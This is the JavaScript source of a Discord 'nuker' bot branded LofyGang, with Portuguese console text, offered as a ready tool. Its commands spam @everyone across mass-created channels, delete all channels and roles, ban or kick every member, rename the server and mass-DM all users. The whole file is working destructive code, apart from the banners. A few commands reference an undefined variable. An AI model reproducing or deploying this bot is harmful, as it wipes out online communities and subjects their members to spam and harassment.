const Discord = require("discord.js");
const fs = require("fs");
const axios = require("axios").default;
const client = new Discord.Client({
  ws: {
    intents: new Discord.Intents(Discord.Intents.ALL)
  }
});
const {
  red,
  green,
  blue,
  yellow,
  cyan,
  greenBright,
  redBright,
  grey,
  yellowBright,
  cyanBright,
  black,
  blueBright
} = require("chalk");
const lofy = require("./lofy.json");
const Everyone = lofy.Everyone;
const nome_canal_mp = lofy.nome_canal_mp;
const criar_cargos = lofy.criar_cargos;
const emoji_menu = lofy.emoji_menu;
const status_da_twitch = lofy.status_da_twitch;
const criar_canais = lofy.criar_canais;
const nome_do_servidor = lofy.nome_do_servidor;
const marcação = lofy.marcação;
const icone_do_servidor = lofy.icone_do_servidor;
const status_bot = lofy.status_bot;
const {
  question
} = require("readline-sync");


const colors = require("colors");
const os = "cls & mode 100, 20";
console.log(
  `
                         

     ██████╗ ██████╗ ███╗   ██╗███████╗██╗ ██████╗         ██╗███████╗ ██████╗ ███╗   ██╗
     ██╔════╝██╔═══██╗████╗  ██║██╔════╝██║██╔════╝         ██║██╔════╝██╔═══██╗████╗  ██║
     ██║     ██║   ██║██╔██╗ ██║█████╗  ██║██║  ███╗        ██║███████╗██║   ██║██╔██╗ ██║
     ██║     ██║   ██║██║╚██╗██║██╔══╝  ██║██║   ██║   ██   ██║╚════██║██║   ██║██║╚██╗██║
     ╚██████╗╚██████╔╝██║ ╚████║██║     ██║╚██████╔╝██╗╚█████╔╝███████║╚██████╔╝██║ ╚████║
     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝     ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
     By LofyGang                                                                                
                         
`.red
);

const token = question("     > Token do bot: ".blue);
const prefix = question("     > Prefixo: ".blue);
const myID = question("     > Id do Dono: ".blue);
client.on("ready", () => {
  console.clear();
  console.log(
    `
    



       ██╗      ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
       ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
       ██║     ██║   ██║█████╗   ╚████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
       ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
       ███████╗╚██████╔╝██║        ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
       ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                  
                                           
                                                                                                                                                                                
          `.rainbow
  );

  console.log(
    greenBright(
      `    Logado na conta > ${client.user.username}#${client.user.discriminator}`
    )
  );
  console.log(greenBright(`    Prefixo > ${prefix}`));
  console.log(greenBright(`    Everyone Ativo > ${Everyone}`));
  console.log(greenBright(`    Permissão Necessária > ADMINISTRATOR`));

  console.log(
    greenBright(`\n    Estou em ${client.guilds.cache.size} servidores`)
  );
  console.log(greenBright(`    Encontrei ${client.users.cache.size} usuarios`));
  console.log("");
  client.user.setActivity(`${status_bot}`, {
    type: "STREAMING",
    url: `https://www.twitch.tv/${status_da_twitch}`
  });
});

client.on("message", async message => {
  if (message.author.bot) return;
  if (message.mentions.everyone === true) {} else if (Everyone === true) {
    if (message.content.startsWith(prefix + "help")) {
      if (message.author.id != myID) {
        return message.reply("Você não pode utilizar este comando!");
      } else {
        const helpEmbed = new Discord.MessageEmbed()
          .setAuthor(
            message.author.username,
            message.author.avatarURL({
              dynamic: true
            })
          )
          .setTitle("Commands Nuker")
          .setDescription(
            `
                    **${emoji_menu} Criar Varios canais:** \`${prefix}cc\` [texto]
                    **${emoji_menu} Cria Varios canais e marca todos com uma mensagem:** \`${prefix}mp\` [texto]
                    **${emoji_menu} Criar Varios cargos:** \`${prefix}mr\` [texto]
                    **${emoji_menu} Deleta todos os canais:** \`${prefix}delcc\`
                    **${emoji_menu} Deleta todos os cargos:** \`${prefix}delrole\`
                    **${emoji_menu} Bane todos os membros:** \`${prefix}banall\`
                    **${emoji_menu} Expulsa todas as pessoas:** \`${prefix}chute\`
                    **${emoji_menu} Muda o nome do servidor:** \`${prefix}visual\`
                    **${emoji_menu} Envia mensagem para todos no pv:** \`${prefix}dmall\`
                    `
          )
          .setImage(
            `https://cdn.discordapp.com/banners/1000374430725320714/98f26831c6572fbbafffdfb939dae7b8.png?size=512`
          )
          .setColor(0x36393e)
          .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
      }
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////COMANDOS//////////////////////////////////////////////////////////////////////////////////
    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    /// Muda foto e nome do servidor

    if (message.content.startsWith(prefix + "visual")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      console.log("    [Lofy] Mudando icone & nome do servidor".green);
      message.guild.setName(`${nome_do_servidor}`);
      message.guild.setIcon(icone_do_servidor);
    }

    /// Cria canais

    if (message.content.startsWith(prefix + "cc")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      if (!message.guild.me.permissions.has("MANAGE_CHANNELS")) {} else {
        if (message.author.id != myID) {
          console.log(
            `    [Lofy] Um idiota tentou utilizando um comando`.white
          );
          return message.reply("Você não pode utilizar este comando!");
        } else {
          let args = message.content.split(" ").slice(1);
          var argresult = args.join(" ");
        }
        const ch = args[0];
        if (!ch)
          return message.reply(
            `     [!] Argumento faltandot **${prefix}ch <nome>**`
          );

        message.delete();
        console.log(yellow("    [Lofy] Criando Canais"));
        for (var i = 0; i < criar_canais; i++) {
          message.guild.channels.create(ch);
        }
      }
    }

    /// Cria canais e marca @everyone

    if (message.content.startsWith(prefix + "mp")) {
      if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
        return console.log(red("    [Lofy] O bot esta sem permição"));
      } else {
        if (message.author.id != myID) {
          console.log(
            `    [Lofy] Um idiota tentou utilizando um comando`.white
          );
          return message.reply("Você não pode utilizar este comando!");
        } else {
          let args = message.content.split(" ").slice(1);
          var argresult = args.join(" ");
          if (!argresult) {
            console.log(
              blueBright(`    [Lofy] Marcando e postando umas coisas`)
            );
            for (var i = 0; i < marcação; i++) {
              message.guild.channels.create("Derrubado-por");

              for (var i = 0; i < marcação; i++) {
                let channels = message.guild.channels.create("Derrubado-por");

                channels.then(function (channel, index) {
                  for (var i = 0; i < marcação; i++) {
                    channel.send("@everyone " + argresult);
                  }
                });
              }
            }
          }
          console.log("    [Lofy] Marcando e criado canais".red);
          for (var i = 0; i < marcação; i++) {
            let channels = message.guild.channels.create(nome_canal_mp);

            channels.then(function (channel, index) {
              for (var i = 0; i < marcação; i++) {
                channel.send("@everyone " + argresult);
              }
            });
          }
        }
      }
    }

    /// Criar cargos

    if (message.content.startsWith(prefix + "mr")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      if (!message.guild.me.permissions.has("MANAGE_ROLES")) {
        return message.reply("Você não poder utilizar este comando!");
      } else {
        const role = args[0];
        if (!role)
          return message.reply(
            `Argumento faltando **${prefix}mr <nome do cargo>**`
          );

        message.delete();
        console.log("    [Lofy] Criando cargos".green);
        for (var i = 0; i < criar_cargos; i++) {
          message.guild.roles
            .create({
              name: `${role}`,
              color: "RANDOM",
              reason: "Nuked by LofyGang"
            })
            .catch(e => console.error(red("    [Lofy] Erro ao criar cargos")));
        }
      }
    }

    /// Deleta todos os canais

    if (message.content.startsWith(prefix + "delcc")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      console.log("    [lofy] Deletando todos os canais".yellow);
      if (message.author.id !== myID) return;
      message.guild.channels.cache.forEach(channel => {
        channel.delete().catch(console.error);
      });
    }

    /// Expulsa todos o servidor

    if (message.content.startsWith(prefix + "chute")) {
      console.log("    [Lofy] Expulsando todos os membros");
      if (!message.guild.me.permissions.has("KICK_MEMBERS")) {
        return message.reply("Você não pode utilizar este comando!");
      } else {
        message.guild.members.cache.forEach(member => {
          member
            .kick({
              reason: "Nuked by LofyGang"
            })
            .then(
              console.log(green(`    [Lofy] ${member.user.tag} foi expulso`))
            )
            .catch(e =>
              console.error(
                red(`    [Lofy] Incapaz de expulsar ${member.user.tag}`)
              )
            );
        });
      }
    }

    ///Deleta todos os cargos do servidor

    if (message.content.startsWith(prefix + "delrole")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      console.log("    [Lofy] Deletando cargos".green);
      message.guild.roles.cache.forEach(roles => {
        roles
          .delete()
          .catch(e =>
            console.error(red(`    [Lofy] Erro ao deletar um cargo`))
          );
      });
    }

    ///Bane todos do servidor

    if (message.content.startsWith(prefix + "banall")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      console.log("    [Lofy] Banindo todos os membros".blue);
      if (!message.guild.me.permissions.has("BAN_MEMBERS")) {} else {
        message.guild.members.cache.forEach(member => {
          member
            .ban({
              days: 7,
              reason: "Nuked by LofyGang"
            })
            .then(
              console.log(green(`    [Lofy] ${member.user.tag} foi banido`))
            )
            .catch(e =>
              console.error(
                red(`    [Lofy] Incapaz de banir ${member.user.tag}`)
              )
            );
        });
      }
    }

    /// mass dm

    if (message.content.startsWith(prefix + "dmall")) {
      if (message.author.id != myID) {
        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
        return message.reply("Você não pode utilizar este comando!");
      }

      console.log("    [Lofy] Enviando mensagem no privado de todos".blue);
      if (message.author.id !== myID) return;
      const msg = args[0];
      if (!msg)
        return message.reply("Especifique a mensagem que deseja enviar");
      message.guild.members.cache.forEach(member => {
        member
          .send(msg)
          .then(
            console.log(
              green(`    [Lofy] Mensagem enviada para ${member.user.tag}`)
            )
          )
          .catch(e =>
            console.error(
              red(`    [Lofy] Erro ao enviar para ${member.user.tag}`)
            )
          );
      });
    }
  }
});

client.login(token).catch(err => {
  console.log(``.red);
  console.log(`    > Um token invalido foi usado`.red);
  console.log(`    > ${err}`.red);
});
